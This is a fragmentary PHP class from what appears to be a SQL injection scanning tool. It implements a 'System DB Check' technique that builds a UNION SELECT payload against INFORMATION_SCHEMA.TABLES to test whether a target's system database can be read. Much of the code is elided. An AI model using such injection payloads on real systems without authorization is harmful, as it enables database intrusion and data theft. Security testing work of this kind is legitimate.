<?php
class Insomnia_Workflow_Research_SQLInjection_Inject_SystemDBCheck
	extends Insomnia_Workflow_Research_SQLInjection_SQLInjectionInjectTechnique
{
	public static $techniqueName = "System DB Check";
	public static $techniqueID = 7;
	...
	public function execute() {
		...
		*/
		...
		$nonInjectableResult = new Insomnia_Common_Data_SQLInjectionInjectTechResult(
			...
			'unknown',
			null,
			'The System Database is not accessible.'
		);
		...
		if($colCountTechResultSet['result'] === false) {
			...
			if($resultSet !== false) {
				if($resultSet['systemBaseAccess'] !== false) {
	...
	private function getBaseInfo($columnCount, $dataBaseType, $paramLimiter) {
		...
		if($outputFieldNumber !== false) {
			...
			switch($dataBaseType) {
				case self::DBTYPE_POSTGRESQL:
					$UNIONentity = 'null';
					$infoQuery = 'table_name';
					$fromQuery = 'FROM INFORMATION_SCHEMA.TABLES';
					break;
			...
			if($UNIONentity !== null) {
				...
				$UNIONstring = '-555' . $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . implode(',', $UNIONelements) . ' ' . $fromQuery . ' -- ';
				...
				if($errorSet['errorExists'] == false) {
					...
					$result = array (
						'systemBaseAccess' => true,
						'possibleDB' => $possibleDB,
						'resultQueue' => $resultQueue,
						'resultData' => 'The System Database is accessible.'
					);
				} else {
					$result = array (
						'systemBaseAccess' => false,
						'possibleDB' => $possibleDB,
						'resultQueue' => $resultQueue,
						'resultData' => 'The System Database is not accessible.'
					);
				}
